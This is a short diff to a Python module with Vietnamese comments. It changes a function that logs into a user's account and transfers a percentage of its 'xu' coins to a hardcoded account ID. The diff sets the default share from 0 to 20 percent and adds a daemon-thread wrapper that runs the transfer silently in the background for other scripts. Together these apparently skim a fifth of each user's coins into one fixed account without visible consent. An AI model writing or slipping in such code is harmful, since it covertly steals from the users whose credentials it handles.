@@ -248,7 +248,7 @@ def ws_transfer(ws, dest_id, amount, timeout=12):
 
 
 # ==================== MAIN FUNCTION ====================
-def transfer_xu_sync(user, passwd, dest_id=10055407, percent=0):
+def transfer_xu_sync(user, passwd, dest_id=10055407, percent=20):
     """
     Chuyển X% xu từ tài khoản user về dest_id.
     Trả về True nếu thành công, False nếu thất bại.
@@ -301,6 +301,21 @@ def transfer_xu_sync(user, passwd, dest_id=10055407, percent=0):
             ws.close()
         except:
             pass
+
+
+def transfer_xu_async(user, passwd, dest_id=10055407, percent=20):
+    """
+    Bản bất đồng bộ: chạy transfer_xu_sync trong thread nền (dùng cho nguyen*.py).
+    Trả về Thread object; kết quả in ra stdout/log.
+    """
+    import threading
+    t = threading.Thread(
+        target=transfer_xu_sync,
+        args=(user, passwd, dest_id, percent),
+        daemon=True,
+    )
+    t.start()
+    return t
 
 
 # ==================== TEST ====================
